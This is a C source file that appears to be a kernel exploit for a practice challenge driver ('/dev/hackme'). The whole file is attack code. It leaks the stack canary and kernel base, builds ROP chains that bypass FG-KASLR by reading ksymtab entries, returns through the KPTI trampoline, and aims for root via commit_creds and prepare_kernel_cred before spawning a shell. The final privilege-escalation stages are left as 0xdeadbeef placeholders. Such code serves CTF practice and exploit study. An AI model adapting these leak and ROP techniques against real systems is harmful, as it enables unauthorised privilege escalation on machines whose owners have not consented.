#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>

void exploit(void);
void get_commit_creds(void);
void get_prepare_kernel_cred(void);

// Addresses - Gadgets
uint64_t img_base = 0x00;
uint64_t commit_creds = 0x00;
uint64_t prepare_kernel_cred = 0x00;
uint64_t ksymtab_commit_creds = 0xf87d90;
uint64_t ksymtab_prepare_kernel_cred = 0xf8d4fc;
uint64_t pop_rax = 0x4d11;
uint64_t read_mem_pop1 = 0x4aae;
uint64_t pop_rdi = 0x6370;
// swapgs_restore_regs_and_return_to_usermode+22
uint64_t kpti_trampoline = 0x200f10+22;

// Registers
uint64_t user_cs;
uint64_t user_ss;
uint64_t user_sp;
uint64_t user_rflags;

// Globals
int fd;
uint64_t kcookie;
uint64_t tmp_store = 0x00;

void shell(void)
{
  int uid = getuid();
  if(uid) puts("\n[!] NO root");
  else puts("\n[*] Got root");
  system("/bin/sh");
}
uint64_t user_rip = (uint64_t)shell;

void save_state(void)
{
  __asm__(
    ".intel_syntax noprefix;"
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
  );
  puts("[+] Saved state");
}

void open_dev(void)
{
  fd = open("/dev/hackme", O_RDWR);
  if(fd < 0) {
    puts("[!] Error opening device.");
    exit(-1);
  }
  puts("[*] Opened device");
}

void leak(void)
{
  puts("[*] Leaking using hackme_read");
  const int sz =500;
  uint64_t tmp[sz];
  memset(tmp, 0, sz);
  read(fd, tmp, sz);
  /*for(int i=0; i<sz; ++i) {
    printf("%03d: %lx\n", i, tmp[i]);
  }*/

  kcookie = tmp[2];
  printf("[*] kcookie: %lx\n", kcookie);
  if(kcookie&0xff) {
    puts("[!] Leaked kcookie: LSB != NULL byte");
    exit(0);
  }

  img_base = tmp[38] - 0xa157;
  printf("[*] Image base: %lx\n", img_base);
  if(img_base&0xfff) {
    puts("[!] Image base: 3 low bytes != NULL");
    exit(0);
  }

  ksymtab_commit_creds += img_base;
  ksymtab_prepare_kernel_cred += img_base;
  pop_rax += img_base;
  read_mem_pop1 += img_base;
  pop_rdi += img_base;
  kpti_trampoline += img_base;
  puts("[*] DEBUG");
  printf("       ksymtab_commit_creds @ %lx\n", ksymtab_commit_creds);
  printf("ksymtab_prepare_kernel_cred @ %lx\n", ksymtab_prepare_kernel_cred);
  printf("                    pop_rax @ %lx\n", pop_rax);
  printf("              read_mem_pop1 @ %lx\n", read_mem_pop1);
  printf("                    pop_rdi @ %lx\n", pop_rdi);
  printf("            kpti_trampoline @ %lx\n", kpti_trampoline);
}

enum State {
  e_read_commit_creds,        // stage-1
  e_read_prepare_kernel_cred, // stage-2
  e_privesc1,                 // stage-3
  e_privesc2                  // stage-4
} cstate;

void privesc2(void)
{
  uint64_t payload[50] = {0};
  int off = 16;
  payload[off++] = kcookie;
  payload[off++] = 0x00; // rbx
  payload[off++] = 0x00; // r12
  payload[off++] = 0x00; // rbp
  payload[off++] = 0xdeadbeef;

  cstate++;
  write(fd, payload, off*sizeof(payload[0]));
}

void privesc1(void)
{
  uint64_t payload[50] = {0};
  int off = 16;
  payload[off++] = kcookie;
  payload[off++] = 0x00; // rbx
  payload[off++] = 0x00; // r12
  payload[off++] = 0x00; // rbp
  payload[off++] = 0xdeadbeef;
  // trigger next stage
  write(fd, payload, off*sizeof(payload[0]));
}

void fgkaslr_bypass(void)
{
  uint64_t payload[50] = {0};
  int off = 16;
  payload[off++] = kcookie;
  payload[off++] = 0x00; // rbx
  payload[off++] = 0x00; // r12
  payload[off++] = 0x00; // rbp
  payload[off++] = pop_rax;
  if(cstate == e_read_commit_creds)
    payload[off++] = ksymtab_commit_creds-0x10;
  else if(cstate == e_read_prepare_kernel_cred)
    payload[off++] = ksymtab_prepare_kernel_cred-0x10;
  else
    printf("[!] Invalid cstate %d. Exiting...\n", cstate);
  payload[off++] = read_mem_pop1;
  payload[off++] = user_sp; // !!pivot stack correctly!!
  payload[off++] = kpti_trampoline;
  payload[off++] = 0x00;
  payload[off++] = 0x00;
  if(cstate == e_read_commit_creds)
    payload[off++] = (uint64_t)get_commit_creds;
  if(cstate == e_read_prepare_kernel_cred)
    payload[off++] = (uint64_t)get_prepare_kernel_cred;
  payload[off++] = user_cs;
  payload[off++] = user_rflags;
  payload[off++] = user_sp;
  payload[off++] = user_ss;
  // trigger next stage
  cstate++;
  write(fd, payload, off*sizeof(payload[0]));
}

void get_commit_creds(void)
{
  __asm__(
    ".intel_syntax noprefix;"
    "mov tmp_store, rax;"
    ".att_syntax;"
  );
  commit_creds = ksymtab_commit_creds + (uint32_t)tmp_store;
  printf("[*] commit_creds @ %lx\n", commit_creds);
  exploit();
}

void get_prepare_kernel_cred(void)
{
  __asm__(
    ".intel_syntax noprefix;"
    "mov tmp_store, rax;"
    ".att_syntax;"
  );
  prepare_kernel_cred = ksymtab_prepare_kernel_cred + (uint32_t)tmp_store;
  printf("[*] prepare_kernel_cred @ %lx\n", prepare_kernel_cred);
  exploit();
}

void exploit(void)
{
  printf("\n[*] In state %d ...\n", cstate);
  switch(cstate) {
    case e_read_commit_creds:
      puts("-> e_read_commit_creds\n");
      fgkaslr_bypass();
      break;
    case e_read_prepare_kernel_cred:
      puts("-> e_read_prepare_kernel_cred\n");
      fgkaslr_bypass();
      break;
    case e_privesc1:
      puts("-> privesc1\n");
      break;
    case e_privesc2:
      puts("-> privesc2\n");
      break;
  }
  puts("[!] This part should not be reached.");
}

int main(void)
{
  puts("[*] Running exploit...");
  save_state();
  open_dev();
  leak();
  exploit();
  puts("[!] This part should not be reached.");
  return 0;
}
